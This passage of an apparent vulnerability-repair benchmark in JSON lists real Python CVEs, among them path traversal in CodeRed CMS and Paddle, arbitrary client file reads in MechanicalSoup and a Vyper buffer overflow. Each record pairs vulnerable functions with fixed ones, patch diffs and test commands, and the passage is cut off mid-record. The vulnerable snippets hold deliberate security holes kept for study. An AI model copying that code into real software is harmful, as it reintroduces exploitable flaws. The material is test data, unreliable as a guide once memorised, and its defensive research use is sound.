    "vul_patch": "--- a/src/auth_server.py\n+++ b/src/auth_server.py\n@@ -9,9 +9,17 @@\n     ### Returns:\n     - **file:** The avatar the service requested.\n     \"\"\"\n-    # Checks if the user has a profile pic uploaded\n-    if os.path.isfile(f\"user_images/pfp/{username}\"):\n-        return FileResponse(f\"user_images/pfp/{username}\", media_type='image/gif')\n+    # Sanitize and validate the username variable (Example: alphanumeric characters allowed)\n+    if not username.isalnum():\n+        # Handle invalid input (username contains non-alphanumeric characters)\n+        return FileResponse(f'{assets_folder}/default_pfp.png', media_type='image/gif')\n+\n+    # Construct the file path using the sanitized username\n+    banner_path = f\"user_images/pfp/{username}\"\n+\n+    # Check if the file exists and is a regular file\n+    if os.path.isfile(banner_path):\n+        return FileResponse(banner_path, media_type='image/gif')\n     else:\n-        # Returns default image if none is uploaded\n+        # Return default image if the user's banner doesn't exist\n         return FileResponse(f'{assets_folder}/default_pfp.png', media_type='image/gif')\n\n--- a/src/auth_server.py\n+++ b/src/auth_server.py\n@@ -9,9 +9,17 @@\n     ### Returns:\n     - **file:** The banner the service requested.\n     \"\"\"\n-    # Checks if the user has a profile pic uploaded\n-    if os.path.isfile(f\"user_images/banner/{username}\"):\n-        return FileResponse(f\"user_images/banner/{username}\", media_type='image/gif')\n+    # Sanitize and validate the username variable (Example: alphanumeric characters allowed)\n+    if not username.isalnum():\n+        # Handle invalid input (username contains non-alphanumeric characters)\n+        return FileResponse(f'{assets_folder}/default_banner.png', media_type='image/gif')\n+\n+    # Construct the file path using the sanitized username\n+    banner_path = f\"user_images/banner/{username}\"\n+\n+    # Check if the file exists and is a regular file\n+    if os.path.isfile(banner_path):\n+        return FileResponse(banner_path, media_type='image/gif')\n     else:\n-        # Returns default image if none is uploaded\n+        # Return default image if the user's banner doesn't exist\n         return FileResponse(f'{assets_folder}/default_banner.png', media_type='image/gif')\n\n",
    "poc_patch": null,
    "unit_test_cmd": null
  },
  {
    "cve_id": "CVE-2021-46897",
    "cve_description": "views.py in Wagtail CRX CodeRed Extensions (formerly CodeRed CMS or coderedcms) before 0.22.3 allows upward protected/..%2f..%2f path traversal when serving protected media.",
    "cwe_info": {
      "CWE-73": {
        "name": "External Control of File Name or Path",
        "description": "The product allows user input to control or influence paths or file names that are used in filesystem operations."
      },
      "CWE-22": {
        "name": "Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')",
        "description": "The product uses external input to construct a pathname that is intended to identify a file or directory that is located underneath a restricted parent directory, but the product does not properly neutralize special elements within the pathname that can cause the pathname to resolve to a location that is outside of the restricted directory."
      }
    },
    "repo": "https://github.com/coderedcorp/coderedcms",
    "patch_url": [
      "https://github.com/coderedcorp/coderedcms/commit/06006cec23a723bc7d76df75ce2c2d795a447902"
    ],
    "programming_language": "Python",
    "vul_func": [
      {
        "id": "vul_py_203_1",
        "commit": "acc37d2",
        "file_path": "coderedcms/views.py",
        "start_line": 110,
        "end_line": 123,
        "snippet": "def serve_protected_file(request, path):\n    \"\"\"\n    Function that serves protected files uploaded from forms.\n    \"\"\"\n    fullpath = os.path.join(cr_settings['PROTECTED_MEDIA_ROOT'], path)\n    if os.path.isfile(fullpath):\n        mimetype, encoding = mimetypes.guess_type(fullpath)\n        with open(fullpath, 'rb') as f:\n            response = HttpResponse(f.read(), content_type=mimetype)\n        if encoding:\n            response[\"Content-Encoding\"] = encoding\n\n        return response\n    raise Http404()"
      }
    ],
    "fix_func": [
      {
        "id": "fix_py_203_1",
        "commit": "06006ce",
        "file_path": "coderedcms/views.py",
        "start_line": 110,
        "end_line": 127,
        "snippet": "def serve_protected_file(request, path):\n    \"\"\"\n    Function that serves protected files uploaded from forms.\n    \"\"\"\n    # Fully resolve all provided paths.\n    mediapath = os.path.abspath(cr_settings['PROTECTED_MEDIA_ROOT'])\n    fullpath = os.path.abspath(os.path.join(mediapath, path))\n\n    # Path must be a sub-path of the PROTECTED_MEDIA_ROOT, and exist.\n    if fullpath.startswith(mediapath) and os.path.isfile(fullpath):\n        mimetype, encoding = mimetypes.guess_type(fullpath)\n        with open(fullpath, 'rb') as f:\n            response = HttpResponse(f.read(), content_type=mimetype)\n        if encoding:\n            response[\"Content-Encoding\"] = encoding\n\n        return response\n    raise Http404()"
      }
    ],
    "vul_patch": "--- a/coderedcms/views.py\n+++ b/coderedcms/views.py\n@@ -2,8 +2,12 @@\n     \"\"\"\n     Function that serves protected files uploaded from forms.\n     \"\"\"\n-    fullpath = os.path.join(cr_settings['PROTECTED_MEDIA_ROOT'], path)\n-    if os.path.isfile(fullpath):\n+    # Fully resolve all provided paths.\n+    mediapath = os.path.abspath(cr_settings['PROTECTED_MEDIA_ROOT'])\n+    fullpath = os.path.abspath(os.path.join(mediapath, path))\n+\n+    # Path must be a sub-path of the PROTECTED_MEDIA_ROOT, and exist.\n+    if fullpath.startswith(mediapath) and os.path.isfile(fullpath):\n         mimetype, encoding = mimetypes.guess_type(fullpath)\n         with open(fullpath, 'rb') as f:\n             response = HttpResponse(f.read(), content_type=mimetype)\n\n",
    "poc_patch": null,
    "unit_test_cmd": null
  },
  {
    "cve_id": "CVE-2023-34457",
    "cve_description": "MechanicalSoup is a Python library for automating interaction with websites. Starting in version 0.2.0 and prior to version 1.3.0, a malicious web server can read arbitrary files on the client using a `<input type=\"file\" ...>` inside HTML form. All users of MechanicalSoup's form submission are affected, unless they took very specific (and manual) steps to reset HTML form field values. Version 1.3.0 contains a patch for this issue.",
    "cwe_info": {
      "CWE-20": {
        "name": "Improper Input Validation",
        "description": "The product receives input or data, but it does\n        not validate or incorrectly validates that the input has the\n        properties that are required to process the data safely and\n        correctly."
      }
    },
    "repo": "https://github.com/MechanicalSoup/MechanicalSoup",
    "patch_url": [
      "https://github.com/MechanicalSoup/MechanicalSoup/commit/d57c4a269bba3b9a0c5bfa20292955b849006d9e"
    ],
    "programming_language": "Python",
    "vul_func": [
      {
        "id": "vul_py_66_1",
        "commit": "b9c8a0c",
        "file_path": "mechanicalsoup/browser.py",
        "start_line": 187,
        "end_line": 293,
        "snippet": "    @classmethod\n    def get_request_kwargs(cls, form, url=None, **kwargs):\n        \"\"\"Extract input data from the form.\"\"\"\n        method = str(form.get(\"method\", \"get\"))\n        action = form.get(\"action\")\n        url = urllib.parse.urljoin(url, action)\n        if url is None:  # This happens when both `action` and `url` are None.\n            raise ValueError('no URL to submit to')\n\n        # read https://www.w3.org/TR/html52/sec-forms.html\n        if method.lower() == \"get\":\n            data = kwargs.pop(\"params\", dict())\n        else:\n            data = kwargs.pop(\"data\", dict())\n        files = kwargs.pop(\"files\", dict())\n\n        # Use a list of 2-tuples to better reflect the behavior of browser QSL.\n        # Requests also retains order when encoding form data in 2-tuple lists.\n        data = [(k, v) for k, v in data.items()]\n\n        multipart = form.get(\"enctype\", \"\") == \"multipart/form-data\"\n\n        # Process form tags in the order that they appear on the page,\n        # skipping those tags that do not have a name-attribute.\n        selector = \",\".join(f\"{tag}[name]\" for tag in\n                            (\"input\", \"button\", \"textarea\", \"select\"))\n        for tag in form.select(selector):\n            name = tag.get(\"name\")  # name-attribute of tag\n\n            # Skip disabled elements, since they should not be submitted.\n            if tag.has_attr('disabled'):\n                continue\n\n            if tag.name == \"input\":\n                if tag.get(\"type\", \"\").lower() in (\"radio\", \"checkbox\"):\n                    if \"checked\" not in tag.attrs:\n                        continue\n                    value = tag.get(\"value\", \"on\")\n                else:\n                    # browsers use empty string for inputs with missing values\n                    value = tag.get(\"value\", \"\")\n\n                # If the enctype is not multipart, the filename is put in\n                # the form as a text input and the file is not sent.\n                if tag.get(\"type\", \"\").lower() == \"file\" and multipart:\n                    filepath = value\n                    if filepath != \"\" and isinstance(filepath, str):\n                        content = open(filepath, \"rb\")\n                    else:\n                        content = \"\"\n                    filename = os.path.basename(filepath)\n                    # If value is the empty string, we still pass it\n                    # for consistency with browsers (see\n                    # https://github.com/MechanicalSoup/MechanicalSoup/issues/250).\n                    files[name] = (filename, content)\n                else:\n                    data.append((name, value))\n\n            elif tag.name == \"button\":\n                if tag.get(\"type\", \"\").lower() in (\"button\", \"reset\"):\n                    continue\n                else:\n                    data.append((name, tag.get(\"value\", \"\")))\n\n            elif tag.name == \"textarea\":\n                data.append((name, tag.text))\n\n            elif tag.name == \"select\":\n                # If the value attribute is not specified, the content will\n                # be passed as a value instead.\n                options = tag.select(\"option\")\n                selected_values = [i.get(\"value\", i.text) for i in options\n                                   if \"selected\" in i.attrs]\n                if \"multiple\" in tag.attrs:\n                    for value in selected_values:\n                        data.append((name, value))\n                elif selected_values:\n                    # A standard select element only allows one option to be\n                    # selected, but browsers pick last if somehow multiple.\n                    data.append((name, selected_values[-1]))\n                elif options:\n                    # Selects the first option if none are selected\n                    first_value = options[0].get(\"value\", options[0].text)\n                    data.append((name, first_value))\n\n        if method.lower() == \"get\":\n            kwargs[\"params\"] = data\n        else:\n            kwargs[\"data\"] = data\n\n        # The following part of the function is here to respect the\n        # enctype specified by the form, i.e. force sending multipart\n        # content. Since Requests doesn't have yet a feature to choose\n        # enctype, we have to use tricks to make it behave as we want\n        # This code will be updated if Requests implements it.\n        if multipart and not files:\n            # Requests will switch to \"multipart/form-data\" only if\n            # files pass the `if files:` test, so in this case we use\n            # a modified dict that passes the if test even if empty.\n            class DictThatReturnsTrue(dict):\n                def __bool__(self):\n                    return True\n                __nonzero__ = __bool__\n\n            files = DictThatReturnsTrue()\n\n        return cls._get_request_kwargs(method, url, files=files, **kwargs)"
      },
      {
        "id": "vul_py_66_2",
        "commit": "b9c8a0c",
        "file_path": "mechanicalsoup/form.py",
        "start_line": 242,
        "end_line": 281,
        "snippet": "    def set(self, name, value, force=False):\n        \"\"\"Set a form element identified by ``name`` to a specified ``value``.\n        The type of element (input, textarea, select, ...) does not\n        need to be given; it is inferred by the following methods:\n        :func:`~Form.set_checkbox`,\n        :func:`~Form.set_radio`,\n        :func:`~Form.set_input`,\n        :func:`~Form.set_textarea`,\n        :func:`~Form.set_select`.\n        If none of these methods find a matching element, then if ``force``\n        is True, a new element (``<input type=\"text\" ...>``) will be\n        added using :func:`~Form.new_control`.\n\n        Example: filling-in a login/password form with EULA checkbox\n\n        .. code-block:: python\n\n            form.set(\"login\", username)\n            form.set(\"password\", password)\n            form.set(\"eula-checkbox\", True)\n\n        Example: uploading a file through a ``<input type=\"file\"\n        name=\"tagname\">`` field (provide the path to the local file,\n        and its content will be uploaded):\n\n        .. code-block:: python\n\n            form.set(\"tagname\", path_to_local_file)\n\n        \"\"\"\n        for func in (\"checkbox\", \"radio\", \"input\", \"textarea\", \"select\"):\n            try:\n                getattr(self, \"set_\" + func)({name: value})\n                return\n            except InvalidFormMethod:\n                pass\n        if force:\n            self.new_control('text', name, value=value)\n            return\n        raise LinkNotFoundError(\"No valid element named \" + name)"
      },
      {
        "id": "vul_py_66_3",
        "commit": "b9c8a0c",
        "file_path": "mechanicalsoup/form.py",
        "start_line": 283,
        "end_line": 304,
        "snippet": "    def new_control(self, type, name, value, **kwargs):\n        \"\"\"Add a new input element to the form.\n\n        The arguments set the attributes of the new element.\n        \"\"\"\n        # Remove existing input-like elements with the same name\n        for tag in ('input', 'textarea', 'select'):\n            for old in self.form.find_all(tag, {'name': name}):\n                old.decompose()\n        # We don't have access to the original soup object (just the\n        # Tag), so we instantiate a new BeautifulSoup() to call\n        # new_tag(). We're only building the soup object, not parsing\n        # anything, so the parser doesn't matter. Specify the one\n        # included in Python to avoid having dependency issue.\n        control = BeautifulSoup(\"\", \"html.parser\").new_tag('input')\n        control['type'] = type\n        control['name'] = name\n        control['value'] = value\n        for k, v in kwargs.items():\n            control[k] = v\n        self.form.append(control)\n        return control"
      }
    ],
    "fix_func": [
      {
        "id": "fix_py_66_1",
        "commit": "d57c4a269bba3b9a0c5bfa20292955b849006d9e",
        "file_path": "mechanicalsoup/browser.py",
        "start_line": 188,
        "end_line": 296,
        "snippet": "    @classmethod\n    def get_request_kwargs(cls, form, url=None, **kwargs):\n        \"\"\"Extract input data from the form.\"\"\"\n        method = str(form.get(\"method\", \"get\"))\n        action = form.get(\"action\")\n        url = urllib.parse.urljoin(url, action)\n        if url is None:  # This happens when both `action` and `url` are None.\n            raise ValueError('no URL to submit to')\n\n        # read https://www.w3.org/TR/html52/sec-forms.html\n        if method.lower() == \"get\":\n            data = kwargs.pop(\"params\", dict())\n        else:\n            data = kwargs.pop(\"data\", dict())\n        files = kwargs.pop(\"files\", dict())\n\n        # Use a list of 2-tuples to better reflect the behavior of browser QSL.\n        # Requests also retains order when encoding form data in 2-tuple lists.\n        data = [(k, v) for k, v in data.items()]\n\n        multipart = form.get(\"enctype\", \"\") == \"multipart/form-data\"\n\n        # Process form tags in the order that they appear on the page,\n        # skipping those tags that do not have a name-attribute.\n        selector = \",\".join(f\"{tag}[name]\" for tag in\n                            (\"input\", \"button\", \"textarea\", \"select\"))\n        for tag in form.select(selector):\n            name = tag.get(\"name\")  # name-attribute of tag\n\n            # Skip disabled elements, since they should not be submitted.\n            if tag.has_attr('disabled'):\n                continue\n\n            if tag.name == \"input\":\n                if tag.get(\"type\", \"\").lower() in (\"radio\", \"checkbox\"):\n                    if \"checked\" not in tag.attrs:\n                        continue\n                    value = tag.get(\"value\", \"on\")\n                else:\n                    # browsers use empty string for inputs with missing values\n                    value = tag.get(\"value\", \"\")\n\n                # If the enctype is not multipart, the filename is put in\n                # the form as a text input and the file is not sent.\n                if is_multipart_file_upload(form, tag):\n                    if isinstance(value, io.IOBase):\n                        content = value\n                        filename = os.path.basename(getattr(value, \"name\", \"\"))\n                    else:\n                        content = \"\"\n                        filename = os.path.basename(value)\n                    # If content is the empty string, we still pass it\n                    # for consistency with browsers (see\n                    # https://github.com/MechanicalSoup/MechanicalSoup/issues/250).\n                    files[name] = (filename, content)\n                else:\n                    if isinstance(value, io.IOBase):\n                        value = os.path.basename(getattr(value, \"name\", \"\"))\n                    data.append((name, value))\n\n            elif tag.name == \"button\":\n                if tag.get(\"type\", \"\").lower() in (\"button\", \"reset\"):\n                    continue\n                else:\n                    data.append((name, tag.get(\"value\", \"\")))\n\n            elif tag.name == \"textarea\":\n                data.append((name, tag.text))\n\n            elif tag.name == \"select\":\n                # If the value attribute is not specified, the content will\n                # be passed as a value instead.\n                options = tag.select(\"option\")\n                selected_values = [i.get(\"value\", i.text) for i in options\n                                   if \"selected\" in i.attrs]\n                if \"multiple\" in tag.attrs:\n                    for value in selected_values:\n                        data.append((name, value))\n                elif selected_values:\n                    # A standard select element only allows one option to be\n                    # selected, but browsers pick last if somehow multiple.\n                    data.append((name, selected_values[-1]))\n                elif options:\n                    # Selects the first option if none are selected\n                    first_value = options[0].get(\"value\", options[0].text)\n                    data.append((name, first_value))\n\n        if method.lower() == \"get\":\n            kwargs[\"params\"] = data\n        else:\n            kwargs[\"data\"] = data\n\n        # The following part of the function is here to respect the\n        # enctype specified by the form, i.e. force sending multipart\n        # content. Since Requests doesn't have yet a feature to choose\n        # enctype, we have to use tricks to make it behave as we want\n        # This code will be updated if Requests implements it.\n        if multipart and not files:\n            # Requests will switch to \"multipart/form-data\" only if\n            # files pass the `if files:` test, so in this case we use\n            # a modified dict that passes the if test even if empty.\n            class DictThatReturnsTrue(dict):\n                def __bool__(self):\n                    return True\n                __nonzero__ = __bool__\n\n            files = DictThatReturnsTrue()\n\n        return cls._get_request_kwargs(method, url, files=files, **kwargs)"
      },
      {
        "id": "fix_py_66_2",
        "commit": "d57c4a269bba3b9a0c5bfa20292955b849006d9e",
        "file_path": "mechanicalsoup/form.py",
        "start_line": 244,
        "end_line": 283,
        "snippet": "    def set(self, name, value, force=False):\n        \"\"\"Set a form element identified by ``name`` to a specified ``value``.\n        The type of element (input, textarea, select, ...) does not\n        need to be given; it is inferred by the following methods:\n        :func:`~Form.set_checkbox`,\n        :func:`~Form.set_radio`,\n        :func:`~Form.set_input`,\n        :func:`~Form.set_textarea`,\n        :func:`~Form.set_select`.\n        If none of these methods find a matching element, then if ``force``\n        is True, a new element (``<input type=\"text\" ...>``) will be\n        added using :func:`~Form.new_control`.\n\n        Example: filling-in a login/password form with EULA checkbox\n\n        .. code-block:: python\n\n            form.set(\"login\", username)\n            form.set(\"password\", password)\n            form.set(\"eula-checkbox\", True)\n\n        Example: uploading a file through a ``<input type=\"file\"\n        name=\"tagname\">`` field (provide an open file object,\n        and its content will be uploaded):\n\n        .. code-block:: python\n\n            form.set(\"tagname\", open(path_to_local_file, \"rb\"))\n\n        \"\"\"\n        for func in (\"checkbox\", \"radio\", \"input\", \"textarea\", \"select\"):\n            try:\n                getattr(self, \"set_\" + func)({name: value})\n                return\n            except InvalidFormMethod:\n                pass\n        if force:\n            self.new_control('text', name, value=value)\n            return\n        raise LinkNotFoundError(\"No valid element named \" + name)"
      },
      {
        "id": "fix_py_66_3",
        "commit": "d57c4a269bba3b9a0c5bfa20292955b849006d9e",
        "file_path": "mechanicalsoup/form.py",
        "start_line": 285,
        "end_line": 307,
        "snippet": "    def new_control(self, type, name, value, **kwargs):\n        \"\"\"Add a new input element to the form.\n\n        The arguments set the attributes of the new element.\n        \"\"\"\n        # Remove existing input-like elements with the same name\n        for tag in ('input', 'textarea', 'select'):\n            for old in self.form.find_all(tag, {'name': name}):\n                old.decompose()\n        # We don't have access to the original soup object (just the\n        # Tag), so we instantiate a new BeautifulSoup() to call\n        # new_tag(). We're only building the soup object, not parsing\n        # anything, so the parser doesn't matter. Specify the one\n        # included in Python to avoid having dependency issue.\n        control = BeautifulSoup(\"\", \"html.parser\").new_tag('input')\n        control['type'] = type\n        control['name'] = name\n        control['value'] = value\n        for k, v in kwargs.items():\n            control[k] = v\n        self._assert_valid_file_upload(control, value)\n        self.form.append(control)\n        return control"
      },
      {
        "id": "fix_py_66_4",
        "commit": "d57c4a269bba3b9a0c5bfa20292955b849006d9e",
        "file_path": "mechanicalsoup/utils.py",
        "start_line": 19,
        "end_line": 23,
        "snippet": "def is_multipart_file_upload(form, tag):\n    return (\n        form.get(\"enctype\", \"\") == \"multipart/form-data\" and\n        tag.get(\"type\", \"\").lower() == \"file\"\n    )"
      },
      {
        "id": "fix_py_66_5",
        "commit": "d57c4a269bba3b9a0c5bfa20292955b849006d9e",
        "file_path": "mechanicalsoup/form.py",
        "start_line": 390,
        "end_line": 402,
        "snippet": "    def _assert_valid_file_upload(self, tag, value):\n        \"\"\"Raise an exception if a multipart file input is not an open file.\"\"\"\n        if (\n            is_multipart_file_upload(self.form, tag) and\n            not isinstance(value, io.IOBase)\n        ):\n            raise ValueError(\n                \"From v1.3.0 onwards, you must pass an open file object \"\n                'directly, e.g. `form[\"name\"] = open(\"/path/to/file\", \"rb\")`. '\n                \"This change is to remediate a security vulnerability where \"\n                \"a malicious web server could read arbitrary files from the \"\n                \"client (CVE-2023-34457).\"\n            )"
      }
    ],
    "vul_patch": "--- a/mechanicalsoup/browser.py\n+++ b/mechanicalsoup/browser.py\n@@ -42,18 +42,20 @@\n \n                 # If the enctype is not multipart, the filename is put in\n                 # the form as a text input and the file is not sent.\n-                if tag.get(\"type\", \"\").lower() == \"file\" and multipart:\n-                    filepath = value\n-                    if filepath != \"\" and isinstance(filepath, str):\n-                        content = open(filepath, \"rb\")\n+                if is_multipart_file_upload(form, tag):\n+                    if isinstance(value, io.IOBase):\n+                        content = value\n+                        filename = os.path.basename(getattr(value, \"name\", \"\"))\n                     else:\n                         content = \"\"\n-                    filename = os.path.basename(filepath)\n-                    # If value is the empty string, we still pass it\n+                        filename = os.path.basename(value)\n+                    # If content is the empty string, we still pass it\n                     # for consistency with browsers (see\n                     # https://github.com/MechanicalSoup/MechanicalSoup/issues/250).\n                     files[name] = (filename, content)\n                 else:\n+                    if isinstance(value, io.IOBase):\n+                        value = os.path.basename(getattr(value, \"name\", \"\"))\n                     data.append((name, value))\n \n             elif tag.name == \"button\":\n\n--- a/mechanicalsoup/form.py\n+++ b/mechanicalsoup/form.py\n@@ -20,12 +20,12 @@\n             form.set(\"eula-checkbox\", True)\n \n         Example: uploading a file through a ``<input type=\"file\"\n-        name=\"tagname\">`` field (provide the path to the local file,\n+        name=\"tagname\">`` field (provide an open file object,\n         and its content will be uploaded):\n \n         .. code-block:: python\n \n-            form.set(\"tagname\", path_to_local_file)\n+            form.set(\"tagname\", open(path_to_local_file, \"rb\"))\n \n         \"\"\"\n         for func in (\"checkbox\", \"radio\", \"input\", \"textarea\", \"select\"):\n\n--- a/mechanicalsoup/form.py\n+++ b/mechanicalsoup/form.py\n@@ -18,5 +18,6 @@\n         control['value'] = value\n         for k, v in kwargs.items():\n             control[k] = v\n+        self._assert_valid_file_upload(control, value)\n         self.form.append(control)\n         return control\n\n--- /dev/null\n+++ b/mechanicalsoup/form.py\n@@ -0,0 +1,5 @@\n+def is_multipart_file_upload(form, tag):\n+    return (\n+        form.get(\"enctype\", \"\") == \"multipart/form-data\" and\n+        tag.get(\"type\", \"\").lower() == \"file\"\n+    )\n\n--- /dev/null\n+++ b/mechanicalsoup/form.py\n@@ -0,0 +1,13 @@\n+    def _assert_valid_file_upload(self, tag, value):\n+        \"\"\"Raise an exception if a multipart file input is not an open file.\"\"\"\n+        if (\n+            is_multipart_file_upload(self.form, tag) and\n+            not isinstance(value, io.IOBase)\n+        ):\n+            raise ValueError(\n+                \"From v1.3.0 onwards, you must pass an open file object \"\n+                'directly, e.g. `form[\"name\"] = open(\"/path/to/file\", \"rb\")`. '\n+                \"This change is to remediate a security vulnerability where \"\n+                \"a malicious web server could read arbitrary files from the \"\n+                \"client (CVE-2023-34457).\"\n+            )\n\n",
    "poc_test_cmd": "#!/bin/bash\n# From ghcr.io/anonymous2578-data/cve-2023-34457:latest\n# bash /workspace/fix-run.sh\nset -e\n\ncd /workspace/MechanicalSoup\ngit apply --whitespace=nowarn /workspace/test.patch /workspace/fix.patch\n/workspace/PoC_env/CVE-2023-34457/bin/python -m pytest tests/test_browser.py::test_enctype_and_file_submit tests/test_stateful_browser.py::test_upload_file_with_malicious_default tests/test_stateful_browser.py::test_upload_file tests/test_stateful_browser.py::test_upload_file_raise_on_string_input\n",
    "unit_test_cmd": "#!/bin/bash\n# From ghcr.io/anonymous2578-data/cve-2023-34457:latest\n# bash /workspace/unit_test.sh\nset -e\n\ncd /workspace/MechanicalSoup\ngit apply --whitespace=nowarn /workspace/fix.patch\n/workspace/PoC_env/CVE-2023-34457/bin/python -m pytest tests/test_browser.py tests/test_stateful_browser.py -k \"not test_enctype_and_file_submit and not test_upload_file and not test_select_form_associated_elements and not test_launch_browser\" -p no:warning --disable-warnings\n"
  },
  {
    "cve_id": "CVE-2024-22419",
    "cve_description": "Vyper is a Pythonic Smart Contract Language for the Ethereum Virtual Machine. The `concat` built-in can write over the bounds of the memory buffer that was allocated for it and thus overwrite existing valid data. The root cause is that the `build_IR` for `concat` doesn't properly adhere to the API of copy functions (for `>=0.3.2` the `copy_bytes` function). A contract search was performed and no vulnerable contracts were found in production. The buffer overflow can result in the change of semantics of the contract. The overflow is length-dependent and thus it might go unnoticed during contract testing. However, certainly not all usages of concat will result in overwritten valid data as we require it to be in an internal function and close to the return statement where other memory allocations don't occur. This issue has been addressed in 0.4.0.",
    "cwe_info": {
      "CWE-787": {
        "name": "Out-of-bounds Write",
        "description": "The product writes data past the end, or before the beginning, of the intended buffer."
      }
    },
    "repo": "https://github.com/vyperlang/vyper",
    "patch_url": [
      "https://github.com/vyperlang/vyper/commit/55e18f6d128b2da8986adbbcccf1cd59a4b9ad6f"
    ],
    "programming_language": "Python",
    "vul_func": [
      {
        "id": "vul_py_429_1",
        "commit": "56b0d4f",
        "file_path": "vyper/builtins/functions.py",
        "start_line": 530,
        "end_line": 589,
        "snippet": "    def build_IR(self, expr, context):\n        args = [Expr(arg, context).ir_node for arg in expr.args]\n        if len(args) < 2:\n            raise StructureException(\"Concat expects at least two arguments\", expr)\n\n        # Maximum length of the output\n        dst_maxlen = sum(\n            [arg.typ.maxlen if isinstance(arg.typ, _BytestringT) else arg.typ.m for arg in args]\n        )\n\n        # TODO: try to grab these from semantic analysis\n        if isinstance(args[0].typ, StringT):\n            ret_typ = StringT(dst_maxlen)\n        else:\n            ret_typ = BytesT(dst_maxlen)\n\n        # Node representing the position of the output in memory\n        dst = IRnode.from_list(\n            context.new_internal_variable(ret_typ),\n            typ=ret_typ,\n            location=MEMORY,\n            annotation=\"concat destination\",\n        )\n\n        ret = [\"seq\"]\n        # stack item representing our current offset in the dst buffer\n        ofst = \"concat_ofst\"\n\n        # TODO: optimize for the case where all lengths are statically known.\n        for arg in args:\n            dst_data = add_ofst(bytes_data_ptr(dst), ofst)\n\n            if isinstance(arg.typ, _BytestringT):\n                # Ignore empty strings\n                if arg.typ.maxlen == 0:\n                    continue\n\n                with arg.cache_when_complex(\"arg\") as (b1, arg):\n                    argdata = bytes_data_ptr(arg)\n\n                    with get_bytearray_length(arg).cache_when_complex(\"len\") as (b2, arglen):\n                        do_copy = [\n                            \"seq\",\n                            copy_bytes(dst_data, argdata, arglen, arg.typ.maxlen),\n                            [\"set\", ofst, [\"add\", ofst, arglen]],\n                        ]\n                        ret.append(b1.resolve(b2.resolve(do_copy)))\n\n            else:\n                ret.append(STORE(dst_data, unwrap_location(arg)))\n                ret.append([\"set\", ofst, [\"add\", ofst, arg.typ.m]])\n\n        ret.append(STORE(dst, ofst))\n\n        # Memory location of the output\n        ret.append(dst)\n\n        return IRnode.from_list(\n            [\"with\", ofst, 0, ret], typ=ret_typ, location=MEMORY, annotation=\"concat\"\n        )"
      }
    ],
    "fix_func": [
      {
        "id": "fix_py_429_1",
        "commit": "55e18f6d128b2da8986adbbcccf1cd59a4b9ad6f",
        "file_path": "vyper/builtins/functions.py",
        "start_line": 530,
        "end_line": 588,
        "snippet": "    def build_IR(self, expr, context):\n        args = [Expr(arg, context).ir_node for arg in expr.args]\n        if len(args) < 2:\n            raise StructureException(\"Concat expects at least two arguments\", expr)\n\n        # Maximum length of the output\n        dst_maxlen = sum(\n            [arg.typ.maxlen if isinstance(arg.typ, _BytestringT) else arg.typ.m for arg in args]\n        )\n\n        # TODO: try to grab these from semantic analysis\n        if isinstance(args[0].typ, StringT):\n            ret_typ = StringT(dst_maxlen)\n        else:\n            ret_typ = BytesT(dst_maxlen)\n\n        # respect API of copy_bytes\n        bufsize = dst_maxlen + 32\n        buf = context.new_internal_variable(BytesT(bufsize))\n\n        # Node representing the position of the output in memory\n        dst = IRnode.from_list(buf, typ=ret_typ, location=MEMORY, annotation=\"concat destination\")\n\n        ret = [\"seq\"]\n        # stack item representing our current offset in the dst buffer\n        ofst = \"concat_ofst\"\n\n        # TODO: optimize for the case where all lengths are statically known.\n        for arg in args:\n            dst_data = add_ofst(bytes_data_ptr(dst), ofst)\n\n            if isinstance(arg.typ, _BytestringT):\n                # Ignore empty strings\n                if arg.typ.maxlen == 0:\n                    continue\n\n                with arg.cache_when_complex(\"arg\") as (b1, arg):\n                    argdata = bytes_data_ptr(arg)\n\n                    with get_bytearray_length(arg).cache_when_complex(\"len\") as (b2, arglen):\n                        do_copy = [\n                            \"seq\",\n                            copy_bytes(dst_data, argdata, arglen, arg.typ.maxlen),\n                            [\"set\", ofst, [\"add\", ofst, arglen]],\n                        ]\n                        ret.append(b1.resolve(b2.resolve(do_copy)))\n\n            else:\n                ret.append(STORE(dst_data, unwrap_location(arg)))\n                ret.append([\"set\", ofst, [\"add\", ofst, arg.typ.m]])\n\n        ret.append(STORE(dst, ofst))\n\n        # Memory location of the output\n        ret.append(dst)\n\n        return IRnode.from_list(\n            [\"with\", ofst, 0, ret], typ=ret_typ, location=MEMORY, annotation=\"concat\"\n        )"
      }
    ],
    "vul_patch": "--- a/vyper/builtins/functions.py\n+++ b/vyper/builtins/functions.py\n@@ -14,13 +14,12 @@\n         else:\n             ret_typ = BytesT(dst_maxlen)\n \n+        # respect API of copy_bytes\n+        bufsize = dst_maxlen + 32\n+        buf = context.new_internal_variable(BytesT(bufsize))\n+\n         # Node representing the position of the output in memory\n-        dst = IRnode.from_list(\n-            context.new_internal_variable(ret_typ),\n-            typ=ret_typ,\n-            location=MEMORY,\n-            annotation=\"concat destination\",\n-        )\n+        dst = IRnode.from_list(buf, typ=ret_typ, location=MEMORY, annotation=\"concat destination\")\n \n         ret = [\"seq\"]\n         # stack item representing our current offset in the dst buffer\n\n",
    "poc_patch": null,
    "unit_test_cmd": null
  },
  {
    "cve_id": "CVE-2024-0818",
    "cve_description": "Arbitrary File Overwrite Via Path Traversal in paddlepaddle/paddle before 2.6",
    "cwe_info": {
      "CWE-73": {
        "name": "External Control of File Name or Path",
        "description": "The product allows user input to control or influence paths or file names that are used in filesystem operations."
      },
      "CWE-22": {
        "name": "Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')",
        "description": "The product uses external input to construct a pathname that is intended to identify a file or directory that is located underneath a restricted parent directory, but the product does not properly neutralize special elements within the pathname that can cause the pathname to resolve to a location that is outside of the restricted directory."
      }
    },
    "repo": "https://github.com/PaddlePaddle/Paddle",
    "patch_url": [
      "https://github.com/PaddlePaddle/Paddle/commit/5c50d1a8b97b310cbc36560ec36d8377d6f29d7c"
    ],
    "programming_language": "Python",
    "vul_func": [
      {
        "id": "vul_py_110_1",
        "commit": "62a1261",
        "file_path": "python/paddle/dataset/common.py",
        "start_line": 73,
        "end_line": 133,
